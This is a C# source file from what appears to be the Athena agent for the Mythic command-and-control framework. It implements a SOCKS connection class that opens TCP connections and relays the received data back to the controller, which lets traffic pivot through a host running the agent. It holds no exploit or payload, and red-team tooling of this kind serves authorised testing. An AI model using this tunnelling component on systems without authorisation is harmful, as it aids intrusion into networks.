using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using SuperSimpleTcp;
using System.ComponentModel.DataAnnotations;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace Athena.Models.Athena.Socks
{
    public class AthenaSocksConnection
    {
        //https://github.com/MythicAgents/Apollo/blob/v3.0.0/Payload_Type/apollo/apollo/agent_code/ApolloInterop/Classes/Tcp/AsyncTcpClient.cs
        public int server_id { get; set; }
        public bool exited { get; set; }
        public SimpleTcpClient client;
        public AutoResetEvent onSocksEvent = new AutoResetEvent(false);
        //private List<byte> outQueue = new List<byte>();
        private byte[] outQueue = new byte[0];

        public AthenaSocksConnection(ConnectionOptions co) {
            this.client = new SimpleTcpClient(co.host, co.port);
            this.client.Settings.StreamBufferSize = 32000;
            this.client.Events.Connected += OnConnected;
            this.client.Events.DataReceived += OnDataReceived;
            this.client.Events.Disconnected += OnDisconnected;
            this.server_id = co.server_id;
            this.exited = false;
        }

        private void OnDisconnected(object? sender, ConnectionEventArgs e)
        {
            this.exited = true;
            this.onSocksEvent.Set();
        }

        private void OnDataReceived(object? sender, SuperSimpleTcp.DataReceivedEventArgs e)
        {
            outQueue = outQueue.Concat(e.Data.Array).ToArray();
        }

        private void OnConnected(object? sender, ConnectionEventArgs e)
        {
            this.onSocksEvent.Set();
        }

        public SocksMessage GetMessage()
        {
            if(this.outQueue.Count() > 0 || this.exited)
            {
                Debug.WriteLine($"[{DateTime.Now}] Returning a message with {this.outQueue.Length} bytes (exited: {this.exited})");
                SocksMessage smOut = new SocksMessage(
                                       this.server_id,
                                       this.outQueue,
                                       this.exited
                );
                smOut.PrepareMessage();
                this.outQueue = new byte[0];
                return smOut;
            }

            return null;
        }
    }
}
